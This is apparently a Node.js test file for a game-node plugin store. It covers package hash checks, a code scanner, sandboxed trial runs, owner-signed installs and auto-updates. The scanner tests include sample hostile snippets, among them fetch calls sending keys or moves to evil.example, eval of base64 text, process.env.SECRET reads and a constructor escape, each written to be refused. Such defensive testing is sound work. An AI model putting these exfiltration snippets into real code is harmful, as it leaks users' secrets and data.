// SPDX-License-Identifier: LicenseRef-Bitcoin-Arena-1.0
// Copyright (c) 2026 The Bitcoin Arena authors. See LICENSE.
// THE PLUGIN STORE (2026-10-09: "See what other nodes host. Install it. Always scan for malicious
// code before install"; 2026-10-10: "games can be downloaded from other nodes"): a seat hands a hosted game over as a package;
// another seat's owner installs it - its manifest, donation set and every file checked byte for byte, its code scanned -
// and it runs from that seat's next start. A doctored file, code that reaches out, or an install not signed by the owner
// is refused.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, existsSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { schnorr } from '@noble/curves/secp256k1.js';
import { openStore } from '../src/store.js';
import { serve } from '../src/server.js';
import { packageOf, verifyPackage, scanSource, loadInstalled } from '../src/plugin-package.js';
import { verifyEd25519 } from '../src/ed25519.js';
import { ownerSecretFromSeed, signOwnerRequest } from '../src/owner.js';
import { ROCK_PAPER_SCISSORS } from '../../rock-paper-scissors/plugin/rock-paper-scissors.js';
import { testHeadToHeadGame, testDonationSet } from './plugins/sign.js';
import { toHex } from '../../arena-protocol/src/hash.js';
import { encodeManifest } from '../../arena-protocol/src/manifest.js';

const sha = (b) => createHash('sha256').update(b).digest('hex');
const RPS_ID = toHex(ROCK_PAPER_SCISSORS.gameId);

test('a hosted game as a package: Rock Paper Scissors stands, its files are its manifest\'s, its code passes the scan', () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  assert.equal(pkg.cores.length, 1);
  assert.equal(pkg.clients.length, 1);
  const v = verifyPackage(pkg, { verify: verifyEd25519, want: RPS_ID });
  assert.equal(v.ok, true, v.why);
  assert.equal(v.name, 'rock-paper-scissors');
});

test('a doctored file, a client the manifest does not name, or another game\'s id is refused by name', () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  const src = Buffer.from(pkg.cores[0].source, 'base64').toString('utf8').replace("'WIN'", "'LOSS'");
  const doctored = { ...pkg, cores: [{ ...pkg.cores[0], source: Buffer.from(src).toString('base64') }] };
  assert.match(verifyPackage(doctored, { verify: verifyEd25519 }).why, /its source is not the file its manifest names/);
  const otherClient = { ...pkg, clients: [{ hash: sha(Buffer.from('<html>other</html>')), body: Buffer.from('<html>other</html>').toString('base64') }] };
  assert.match(verifyPackage(otherClient, { verify: verifyEd25519 }).why, /not a client its manifest names/);
  assert.match(verifyPackage(pkg, { verify: verifyEd25519, want: 'ab'.repeat(32) }).why, /not abababab/);
});

test('the scan: code that loads modules, evaluates, reaches the network, the file system or the global scope is refused', () => {
  assert.deepEqual(scanSource('export const DECIDE = { decide(m) { return {}; } };'), []);
  const rules = (s) => scanSource(s).map((f) => f.rule);
  assert.deepEqual(rules("import fs from 'node:fs';"), ['loads another module']);
  assert.deepEqual(rules('const x = await import("http");'), ['loads another module']);
  assert.deepEqual(rules('eval(atob(x))'), ['evaluates code', 'hides its text']);
  assert.deepEqual(rules('const k = "\\x66\\x65\\x74\\x63\\x68";'), ['hides its text'], 'an escaped name');
  assert.deepEqual(rules('fetch("https://evil.example/" + key)'), ['reaches the network']);
  assert.deepEqual(rules('process.env.SECRET'), ['reaches the file system or the process']);
  assert.deepEqual(rules('globalThis.x = 1'), ['reaches the global scope']);
  assert.deepEqual(rules('(()=>{}).constructor.constructor("return this")()'), ['reaches its own constructor']);
  // a game signed by its developer whose decide adapter reaches the network: its hashes match, the scan still refuses it
  const bad = 'export const DECIDE = { name: "bad", decide(moves) { fetch("https://evil.example/?m=" + JSON.stringify(moves)); return {}; } };';
  const core = { name: 'bad', hash: sha(Buffer.from(bad)), adapter: null, configs: new Map([['11'.repeat(32), {}]]) };
  const game = testHeadToHeadGame({ name: 'bad-game', core });
  const pkg = { format: 'arena-plugin/v1', name: 'bad-game', manifest: toHex(encodeManifest(game.manifest)), donationSet: testDonationSet('bad-game').map((r) => ({ recipientPk: toHex(r.recipientPk), shareBps: r.shareBps, label: r.label })),
    cores: [{ hash: core.hash, name: 'bad', configs: ['11'.repeat(32)], source: Buffer.from(bad).toString('base64') }], clients: [] };
  const v = verifyPackage(pkg, { verify: verifyEd25519 });
  assert.equal(v.ok, false);
  assert.match(v.why, /the scan refuses it: reaches the network \(line 1\)/);
});

test('install from another seat: signed by the owner, checked, kept; loaded at the next start, its adapter plays', async () => {
  const a = await serve(openStore(), { plugins: [ROCK_PAPER_SCISSORS], port: 0 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const seed = new Uint8Array(32).fill(7), secret = ownerSecretFromSeed(seed);
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  const b = await serve(openStore(), { plugins: [], port: 0, pluginsDir: dir, owner: { store: { read: () => rec, write: () => {}, writeCode: () => {} } } });
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`;
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = (args, s = secret) => signOwnerRequest({ node, action: 'install', args, secret: s, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = (body) => fetch(`${B}/owner/plugins/install`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
    assert.equal((await post(req({ game: RPS_ID, from: A }, ownerSecretFromSeed(new Uint8Array(32).fill(9))))).status, 403, 'not the owner');
    assert.equal((await fetch(`${A}/plugin?game=${'ab'.repeat(32)}`)).status, 404);
    const r = await post(req({ game: RPS_ID, from: A }));
    const j = await r.json();
    assert.equal(r.status, 200, j.why);
    assert.equal(j.name, 'rock-paper-scissors');
    assert.ok(existsSync(join(dir, RPS_ID, 'package.json')));
    const list = await (await fetch(`${B}/owner/plugins`)).json();
    assert.deepEqual(list.installed.map((x) => [x.id, x.running]), [[RPS_ID, true]], 'installed and running at once - no restart');
    // the next start: loaded, checked again, and its decide adapter plays rock against scissors
    const got = await loadInstalled(dir, { verify: verifyEd25519 });
    assert.deepEqual(got.refused, []);
    assert.equal(toHex(got.registrations[0].gameId), RPS_ID);
    const [core] = [...got.registrations[0].cores.values()];
    // never imported into the node's thread: it plays in its sandbox, moves in and verdicts out as JSON
    assert.equal(core.adapter, undefined);
    assert.deepEqual(sandboxFor(core).call('decide', { moves: [{ key: 'a', move: 0 }, { key: 'b', move: 2 }] }), { a: 'WIN', b: 'LOSS' });
    assert.deepEqual(readdirSync(join(dir, RPS_ID)).sort().map((f) => f.split('-')[0]), ['client', 'core', 'package.json']);
  } finally { await a.close(); await b.close(); }
});

// ---- the App Store slice (2026-10-10: in the browser, no restart, updates as a setting, malicious checks) ----
import { writeFileSync, mkdirSync } from 'node:fs';
import { pathToFileURL } from 'node:url';
import { signManifest } from '../../arena-donor/src/manifest-sign.js';
import { testDevKey } from './plugins/sign.js';
import { RESULT_TYPE, PAYOUT_RULE, NO_PARENT, gameIdOf } from '../../arena-protocol/src/manifest.js';
import { donationSetId } from '../../arena-protocol/src/donation.js';
import { checkPackage, checkUpdate } from '../src/plugin-check.js';
import { trialRun } from '../src/plugin-trial.js';

// a head-to-head game "tic" in two versions by one developer, and an impostor v2 by another; decide adapters on disk
const srcDir = mkdtempSync(join(tmpdir(), 'arena-tic-'));
const ticSource = (tag) => `export const DECIDE = { name: 'tic ${tag}', decide(moves) { const out = {}; const best = Math.max(...moves.map((m) => m.move));
  const winners = moves.filter((m) => m.move === best).length; for (const m of moves) out[m.key] = winners === moves.length ? 'DRAW' : m.move === best ? 'WIN' : 'LOSS'; return out; } };\n`;
async function ticGame({ version, parent = NO_PARENT, dev = 'tic dev', tag = 'v' + version }) {
  const src = ticSource(tag), file = join(srcDir, `decide-${tag}.mjs`);
  writeFileSync(file, src);
  const hash = sha(Buffer.from(src)), cfg = '22'.repeat(32);
  const set = testDonationSet('tic');
  const key = testDevKey(dev);
  const manifest = signManifest({ gameName: 'tic', gameDevPubkey: key.pubkey, version, parentManifestId: parent, resultType: RESULT_TYPE.HEAD_TO_HEAD,
    cores: [{ hash: Buffer.from(hash, 'hex'), configs: [Buffer.from(cfg, 'hex')] }], runTicksMax: 0, roundPeriodMs: 0n, payoutRule: PAYOUT_RULE.RANK_CURVE,
    rankNumerator: 3, rankDenominator: 4, minScore: 2, clients: [], gameDonationSetId: donationSetId(set), players: 2, moveCount: 3, revealWindowMs: 60000n }, key);
  const adapter = (await import(pathToFileURL(file).href)).DECIDE;
  return { name: 'tic', manifest, gameId: gameIdOf(manifest), donationSet: set, clientUrls: [],
    cores: new Map([[hash, { name: `tic ${tag}`, hash, url: pathToFileURL(file).href, adapter, configs: new Map([[cfg, {}]]) }]]) };
}

test('the page\'s report lists every check, passed or not; the seat adds the trial run', async () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  const r = checkPackage(pkg, { verify: verifyEd25519 });
  assert.equal(r.ok, true);
  assert.deepEqual(r.checks.map((c) => c.ok), r.checks.map(() => true));
  assert.ok(r.checks.some((c) => /signed by its developer/.test(c.check)));
  const seat = verifyPackage(pkg, { verify: verifyEd25519 });
  assert.match(seat.checks.at(-1).check, /runs in the sandbox/);
  assert.match(seat.checks.at(-1).detail, /9 move combinations/);
  // the trial run catches what the scan cannot see
  const m = ROCK_PAPER_SCISSORS.manifest;
  assert.equal(trialRun('export const DECIDE = { decide(m) { for (let i = 0; ; i++) {} } };', m).ok, false, 'an endless loop');
  assert.match(trialRun('export const DECIDE = { decide(m) { return Object.fromEntries(m.map((x) => [x.key, Math.random() < 0.5 ? "WIN" : "LOSS"])); } };', m).why, /differently twice/);
  assert.match(trialRun('export const DECIDE = { decide(m) { return { cheat: "WIN" }; } };', m).why, /each player exactly once/);
  assert.match(trialRun('export const DECIDE = { decide(m) { throw new Error("boom"); } };', m).why, /boom/);
});

test('an update is the same developer\'s next version of the installed game', async () => {
  const v1 = await ticGame({ version: 1 });
  const v2 = await ticGame({ version: 2, parent: v1.gameId });
  const other = await ticGame({ version: 2, parent: v1.gameId, dev: 'someone else', tag: 'x2' });
  const info = (g) => ({ gameId: toHex(g.gameId), devKey: toHex(g.manifest.gameDevPubkey), version: g.manifest.version, parent: toHex(g.manifest.parentManifestId) });
  assert.equal(checkUpdate(info(v1), info(v2)).ok, true);
  assert.match(checkUpdate(info(v1), info(other)).why, /signed by another developer/);
  assert.match(checkUpdate(info(v2), info(v1)).why, /names .* as its parent|not newer/);
});

test('install, update and remove from the owner, each running at once (no restart); automatic updates as a setting', async () => {
  const v1 = await ticGame({ version: 1, tag: 'a1' });
  const v2 = await ticGame({ version: 2, parent: v1.gameId, tag: 'a2' });
  const v3 = await ticGame({ version: 3, parent: v2.gameId, tag: 'a3' });
  const a = await serve(openStore(), { plugins: [v1, v2], port: 0 });
  // C hosts v3 with its earlier versions' manifests (an installed update's chain): a version stands only on its parent
  const c = await serve(openStore(), { plugins: [{ ...v3, ancestors: [v1.manifest, v2.manifest] }], port: 0 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const secret = ownerSecretFromSeed(new Uint8Array(32).fill(7));
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  process.env.ARENA_AUTO_UPDATE_MS = '300';   // the sweep, fast for the test (10 minutes on a seat)
  const b = await serve(openStore(), { plugins: [], port: 0, pluginsDir: dir, owner: { store: { read: () => rec, write: (o) => Object.assign(rec, o), writeCode: () => {} } } });
  delete process.env.ARENA_AUTO_UPDATE_MS;
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`, C = `http://127.0.0.1:${c.port}`;
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = (action, args) => signOwnerRequest({ node, action, args, secret, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = async (path, body) => { const r = await fetch(B + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }); return [r.status, await r.json()]; };
    const games = async () => (await (await fetch(`${B}/games`)).json()).games.map((g) => g.id).sort();
    const id1 = toHex(v1.gameId), id2 = toHex(v2.gameId), id3 = toHex(v3.gameId);
    let [st, j] = await post('/owner/plugins/install', req('install', { game: id1, from: A }));
    assert.equal(st, 200, j.why);
    assert.equal(j.running, true);
    assert.deepEqual(await games(), [id1], 'running at once: the seat lists it without a restart');
    [st, j] = await post('/owner/plugins/update', req('update', { game: id2, from: A, replaces: id1 }));
    assert.equal(st, 200, j.why);
    assert.deepEqual(await games(), [id1, id2].sort(), 'the new version runs; the old one stays for the rounds it holds');
    const list = await (await fetch(`${B}/owner/plugins`)).json();
    assert.equal(list.hosted.find((g) => g.id === id1).supersededBy, id2);
    // an update that skips a version, or comes from another developer, is refused
    [st, j] = await post('/owner/plugins/update', req('update', { game: id3, from: C, replaces: id1 }));
    assert.equal(st, 422);
    assert.match(j.why, /parent/);
    // remove the old version: no round of it is held here
    [st, j] = await post('/owner/plugins/remove', req('remove', { game: id1 }));
    assert.equal(st, 200, j.why);
    assert.deepEqual(await games(), [id2]);
    // AUTOMATIC UPDATES: the owner turns them on with C as a source; the next sweep takes v3 over v2
    [st, j] = await post('/owner/settings', req('settings', { autoUpdate: true, sources: [C] }));
    assert.equal(st, 200);
    assert.deepEqual(j.settings, { autoUpdate: true, sources: [C] });
    let seen = [];
    for (let i = 0; i < 40 && !seen.includes(id3); i++) { await new Promise((r) => setTimeout(r, 100)); seen = await games(); }
    assert.deepEqual(seen, [id2, id3].sort(), 'v3 taken by itself, running next to v2 (which keeps the rounds it holds)');
    assert.equal((await (await fetch(`${B}/owner/plugins`)).json()).hosted.find((g) => g.id === id2).supersededBy, id3);
  } finally { await a.close(); await b.close(); await c.close(); }
});

// ---- the network store (letter 2026-10-10: federation invite, donation sets, series and chain, on the same check-then-install
// path as games; each against its own authority) ----
import { checkNetworkPackage, networkPackageId } from '../src/network-check.js';
import { inviteForGuardians } from '../src/invite.js';
import { HOSTED } from './plugins/hosted.js';
import { NEXTBLOCK_GAME_ID, TRUCK_CORE_HASH, TRUCK_V3_CONFIG_HASH } from '../../nextblock/plugin/nextblock.js';
import { seriesTemplate, seriesIndexAt, seriesId as seriesIdOf } from '../../arena-protocol/src/series.js';
import { NETWORK_ID_REGTEST } from '../../arena-protocol/src/genesis-ids.js';
import { TEST_FEDERATION_ID } from '../../arena-protocol/src/test-federation.js';
import { TEST_DONATION_SET_REGTEST } from '../../arena-protocol/src/test-donation-sets.js';
import { decodeDonationSetBody } from '../../arena-protocol/src/authority.js';
import { encodeRoundContract } from '../../arena-protocol/src/contracts.js';
import { sandboxFor } from '../src/core-sandbox.js';

// the regtest serial-2 set (series-donation-in-force.test.js), in force from 900100, signed by the regtest authority
const SET2 = { ...decodeDonationSetBody(Uint8Array.from(Buffer.from('1400019855e6790b51f0a6ec3ee1a4d83f4de9ad4be7bffb169f0525ad00a59ced5b380000000000000002000dbc040099100001000200466c6e75726c31647036386775726e3867686a376572306465736867656677763475787a6d747364336a6a376d7277773465786375703064656a68736170647679306e387265381a0b00466c6e75726c31647036386775726e3867686a376572306465736867656677763475787a6d747364336a6a376d7277773465786375703064656a687361706476673764706667710d05', 'hex'))),
  signature: Uint8Array.from(Buffer.from('f007229c5185a12eeed3310cd5722b576d39121927ef6cdf9624fb868ac61e200cdf60274fbb68cd6f46425d05ba611c989d06e4f606e9ef3b34f33244332e0b', 'hex')) };
const netSeries = (nodes) => seriesTemplate({
  networkId: NETWORK_ID_REGTEST, configHash: TRUCK_V3_CONFIG_HASH, censusConfirmations: 1, gameVerifySlots: 2, settlementSlots: 2,
  gameId: NEXTBLOCK_GAME_ID, simCoreHash: TRUCK_CORE_HASH, committeeTimeMs: 0n, randomnessRule: 'bitcoin-block-hash', startTimeMs: 0n, entryCloseMs: 0n,
  objectionWindowMs: 600000n, custody: 'FEDERATION', slashMinimumServed: 20, slashRemainder: 'SPLIT',
  federationId: TEST_FEDERATION_ID, stakeExpiryBlocks: 144, publicationRelays: ['wss://r.example'],
  donationSetId: donationSetId(SET2.recipients), censusHeight: 900100, censusRoot: new Uint8Array(32).fill(2), stakeMsat: 100000n,
  bondMinSats: 50000n, blockTicks: 4920, exposureReference: 1000, corridorHalfWidth: 40, spawnFreeRadius: 20,
  timeFloor: 30, timeCeil: 150, minScore: 1, rankNumerator: 3, rankDenominator: 4, nodes,
}, seriesIndexAt(NETWORK_ID_REGTEST, Date.now()) + 1);

test('a network package: one whose invite, donation sets, series and chain match is installed and in force at once; a mismatch is refused on its line', async () => {
  const invite = inviteForGuardians(TEST_FEDERATION_ID, [{ url: 'ws://127.0.0.1:1/', peer: 0 }]);
  const a0 = await serve(openStore(), { plugins: HOSTED, port: 0 });
  const nodes = [a0.round.pubkey, new Uint8Array(32).fill(8)]; await a0.close();
  const series = netSeries(nodes), sid = toHex(seriesIdOf(series));
  const a = await serve(openStore(), { plugins: HOSTED, port: 0, chain: 'bitcoin-regtest', federationInvite: invite, donationSets: [TEST_DONATION_SET_REGTEST, SET2], series: [series], seriesEveryMs: 100 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const secret = ownerSecretFromSeed(new Uint8Array(32).fill(7));
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  const owner = { store: { read: () => rec, write: (o) => Object.assign(rec, o), writeCode: () => {} } };
  // B reads regtest and holds only serial 1 and no series; C reads testnet4
  const b = await serve(openStore(), { plugins: HOSTED, port: 0, pluginsDir: dir, chain: 'bitcoin-regtest', donationSets: [TEST_DONATION_SET_REGTEST], seriesEveryMs: 100, owner });
  const c = await serve(openStore(), { plugins: HOSTED, port: 0, pluginsDir: mkdtempSync(join(tmpdir(), 'arena-plugins-')), chain: 'bitcoin-testnet4', owner });
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`, C = `http://127.0.0.1:${c.port}`;
    const net = toHex(NETWORK_ID_REGTEST);
    const pkg = await (await fetch(`${A}/network?network=${net}`)).json();
    assert.deepEqual([pkg.manifest.chain, pkg.manifest.federationId, pkg.manifest.series], ['bitcoin-regtest', toHex(TEST_FEDERATION_ID), [sid]]);
    // THE PAGE'S REPORT: every line passed for B (regtest, hosts nextblock)
    const page = checkNetworkPackage(pkg, { verify: verifyEd25519, seatChain: 'bitcoin-regtest', hostsGame: (id) => id === toHex(NEXTBLOCK_GAME_ID) });
    assert.equal(page.ok, true, page.why);
    for (const want of [/chain is this seat's chain/, /invite's federation is the one its manifest names/, /donation set serial 2 is signed by the network's donation authority/,
      /series .* names a donation set this package carries, the one in force/, /series .* is of a game this seat hosts/]) assert.ok(page.checks.some((x) => want.test(x.check) && x.ok), String(want));
    // A MISMATCH, each failing on its own line: a set the manifest does not name, a signature that does not verify, another chain
    const firstBad = (r) => r.checks.find((x) => !x.ok).check;
    const named = { ...pkg, manifest: { ...pkg.manifest, donationSets: [pkg.manifest.donationSets[0], 'ab'.repeat(32)] } };
    named.id = networkPackageId(named.manifest);
    assert.match(firstBad(checkNetworkPackage(named, { verify: verifyEd25519, seatChain: 'bitcoin-regtest' })), /donation set serial 2 is the one its manifest names/);
    const sig = pkg.donationSets[1].signature, forged = { ...pkg, donationSets: [pkg.donationSets[0], { ...pkg.donationSets[1], signature: (sig[0] === '0' ? '1' : '0') + sig.slice(1) }] };
    assert.match(firstBad(checkNetworkPackage(forged, { verify: verifyEd25519, seatChain: 'bitcoin-regtest' })), /donation set serial 2 is signed by the network's donation authority/);
    assert.match(firstBad(checkNetworkPackage(pkg, { verify: verifyEd25519, seatChain: 'bitcoin-testnet4' })), /its chain is this seat's chain/);
    // THE SEAT: C (testnet4) refuses it by that line; B takes it, signed by its owner, and it is in force without a restart
    const req = (node, action, args) => signOwnerRequest({ node, action, args, secret, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = async (base, path, body) => { const r = await fetch(base + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }); return [r.status, await r.json()]; };
    const nodeOf = async (base) => (await (await fetch(`${base}/owner`)).json()).node;
    let [st, j] = await post(C, '/owner/network/install', req(await nodeOf(C), 'network-install', { network: net, from: A }));
    assert.equal(st, 422);
    assert.match(j.why, /its chain is this seat's chain: bitcoin-regtest, and this seat reads bitcoin-testnet4/);
    const nodeB = await nodeOf(B);
    assert.equal((await (await fetch(`${B}/series`)).json()).series.length, 0, 'B holds no series before');
    [st, j] = await post(B, '/owner/network/install', req(nodeB, 'install', { network: net, from: A }));
    assert.equal(st, 401, 'a request signed for another action');
    [st, j] = await post(B, '/owner/network/install', req(nodeB, 'network-install', { network: net, from: A }));
    assert.equal(st, 200, j.why);
    assert.ok(j.checks.some((x) => /rounds pass this seat's doors/.test(x.check) && x.ok), 'the seat\'s trial');
    const view = await (await fetch(`${B}/owner/network`)).json();
    assert.deepEqual(view.installed.map((x) => [x.network, x.federationId, x.sets.map((s) => s.serial), x.series.map((s) => [s.id, s.held])]),
      [[net, toHex(TEST_FEDERATION_ID), ['1', '2'], [[sid, true]]]], 'listed as installed');
    let held = [];
    for (let i = 0; i < 50 && !held.length; i++) { await new Promise((r) => setTimeout(r, 100)); held = (await (await fetch(`${B}/series`)).json()).series.filter((x) => x.written > 0); }
    assert.deepEqual(held.map((x) => x.series), [sid], 'its series written at once - no restart');
    // REMOVE: refused while a round of its series is unfinished here
    [st, j] = await post(B, '/owner/network/remove', req(nodeB, 'network-remove', { network: net }));
    assert.equal(st, 409);
    assert.match(j.why, /depend on that network package are not finished/);
    // THE NEXT START: the kept package checked and tried again, and held
    await b.close();
    const b2 = await serve(openStore(), { plugins: HOSTED, port: 0, pluginsDir: dir, chain: 'bitcoin-regtest', donationSets: [TEST_DONATION_SET_REGTEST], seriesEveryMs: 100, owner });
    try {
      const again = await (await fetch(`http://127.0.0.1:${b2.port}/owner/network`)).json();
      assert.deepEqual(again.installed.map((x) => x.series.map((s) => [s.id, s.held])), [[[sid, true]]], 'held again at the next start');
    } finally { await b2.close(); }
    console.log('  FACTS:', JSON.stringify({ pageLines: page.checks.length, held: held[0].written }));
  } finally { await a.close(); await b.close(); await c.close(); }
});

test('succession at the seat: a network package naming a successor federation makes the old one draining - its series stop, a new paying round naming it is refused', async () => {
  const OLD_FED = new Uint8Array(32).fill(0xcd);
  const inviteNew = inviteForGuardians(TEST_FEDERATION_ID, [{ url: 'ws://127.0.0.1:1/', peer: 0 }]);
  const inviteOld = inviteForGuardians(OLD_FED, [{ url: 'ws://127.0.0.1:2/', peer: 0 }]);
  const nodes = [new Uint8Array(32).fill(7), new Uint8Array(32).fill(8)];
  const succ = netSeries(nodes), oldSeries = { ...netSeries(nodes), federationId: OLD_FED };
  const a = await serve(openStore(), { plugins: HOSTED, port: 0, chain: 'bitcoin-regtest', federationInvite: inviteNew, donationSets: [TEST_DONATION_SET_REGTEST, SET2], series: [succ], seriesEveryMs: 100 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const secret = ownerSecretFromSeed(new Uint8Array(32).fill(7));
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  const owner = { store: { read: () => rec, write: (o) => Object.assign(rec, o), writeCode: () => {} } };
  const opts = { plugins: HOSTED, port: 0, pluginsDir: dir, chain: 'bitcoin-regtest', federationInvite: inviteOld, donationSets: [TEST_DONATION_SET_REGTEST, SET2], series: [oldSeries], seriesEveryMs: 100, owner };
  const b = await serve(openStore(), opts);
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`;
    const held = async (base) => (await (await fetch(`${base}/series`)).json()).series.map((x) => x.series).sort();
    const oldId = toHex(seriesIdOf(oldSeries)), succId = toHex(seriesIdOf(succ));
    assert.deepEqual(await held(B), [oldId], 'B writes the old federation\'s series before');
    const post = (c) => fetch(`${B}/round`, { method: 'POST', body: encodeRoundContract(c) });
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = signOwnerRequest({ node, action: 'network-install', args: { network: toHex(NETWORK_ID_REGTEST), from: A }, secret, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const r = await fetch(`${B}/owner/network/install`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(req) });
    assert.equal(r.status, 200, (await r.clone().json()).why);
    const view = await (await fetch(`${B}/owner/network`)).json();
    assert.deepEqual(view.draining.map((d) => [d.federationId, d.successor]), [[toHex(OLD_FED), toHex(TEST_FEDERATION_ID)]]);
    assert.deepEqual(await held(B), [succId], 'the old series no longer written; the successor\'s is');
    const refused = await post(oldSeries);
    const why = await refused.text();
    assert.equal(refused.status, 409);
    assert.match(why, /federation cdcdcdcdcdcdcdcd is draining since .*its successor is debd8c007b89b0f1/);
    // THE NEXT START keeps it draining
    await b.close();
    const b2 = await serve(openStore(), { ...opts, port: 0 });
    try {
      const again = await (await fetch(`http://127.0.0.1:${b2.port}/owner/network`)).json();
      assert.deepEqual(again.draining.map((d) => d.federationId), [toHex(OLD_FED)]);
      assert.deepEqual(await held(`http://127.0.0.1:${b2.port}`), [succId]);
    } finally { await b2.close(); }
    console.log('  FACTS:', JSON.stringify({ refused: why.slice(0, 160) }));
  } finally { await a.close(); await b.close(); }
});

test('automatic network updates: a newer package of the same network and federation is taken by itself; one naming another federation is left to the owner', async () => {
  const inviteF = inviteForGuardians(TEST_FEDERATION_ID, [{ url: 'ws://127.0.0.1:1/', peer: 0 }]);
  const inviteG = inviteForGuardians(new Uint8Array(32).fill(0xee), [{ url: 'ws://127.0.0.1:3/', peer: 0 }]);
  const nodes = [new Uint8Array(32).fill(7), new Uint8Array(32).fill(8)];
  const series = netSeries(nodes);
  // A1: serial 1 only, no series; A2: the same federation, serials 1 and 2 and a series; A3: another federation
  const a1 = await serve(openStore(), { plugins: HOSTED, port: 0, chain: 'bitcoin-regtest', federationInvite: inviteF, donationSets: [TEST_DONATION_SET_REGTEST] });
  const a2 = await serve(openStore(), { plugins: HOSTED, port: 0, chain: 'bitcoin-regtest', federationInvite: inviteF, donationSets: [TEST_DONATION_SET_REGTEST, SET2], series: [series], seriesEveryMs: 100 });
  const a3 = await serve(openStore(), { plugins: HOSTED, port: 0, chain: 'bitcoin-regtest', federationInvite: inviteG, donationSets: [TEST_DONATION_SET_REGTEST, SET2] });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const secret = ownerSecretFromSeed(new Uint8Array(32).fill(7));
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  process.env.ARENA_AUTO_UPDATE_MS = '300';
  const b = await serve(openStore(), { plugins: HOSTED, port: 0, pluginsDir: dir, chain: 'bitcoin-regtest', donationSets: [TEST_DONATION_SET_REGTEST], seriesEveryMs: 100,
    owner: { store: { read: () => rec, write: (o) => Object.assign(rec, o), writeCode: () => {} } } });
  delete process.env.ARENA_AUTO_UPDATE_MS;
  try {
    const url = (s) => `http://127.0.0.1:${s.port}`, B = url(b), net = toHex(NETWORK_ID_REGTEST);
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = (action, args) => signOwnerRequest({ node, action, args, secret, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = async (path, body) => { const r = await fetch(B + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }); return [r.status, await r.json()]; };
    let [st, j] = await post('/owner/network/install', req('network-install', { network: net, from: url(a1) }));
    assert.equal(st, 200, j.why);
    const view = async () => (await (await fetch(`${B}/owner/network`)).json());
    assert.deepEqual((await view()).installed[0].sets.map((s) => s.serial), ['1']);
    // the owner turns automatic updates on, A3 (another federation) first, then A2
    [st, j] = await post('/owner/settings', req('settings', { autoUpdate: true, sources: [url(a3), url(a2)] }));
    assert.equal(st, 200);
    let v;
    for (let i = 0; i < 50; i++) { await new Promise((r) => setTimeout(r, 100)); v = await view(); if (v.installed[0].sets.length === 2) break; }
    assert.deepEqual(v.installed[0].sets.map((s) => s.serial), ['1', '2'], 'A2\'s newer package taken by itself');
    assert.deepEqual(v.installed[0].series.map((s) => [s.id, s.held]), [[toHex(seriesIdOf(series)), true]], 'its series held, no restart');
    assert.equal(v.installed[0].federationId, toHex(TEST_FEDERATION_ID), 'A3\'s other federation was not taken');
    assert.deepEqual(v.draining, [], 'and nothing is draining');
  } finally { for (const s of [a1, a2, a3, b]) await s.close(); }
});
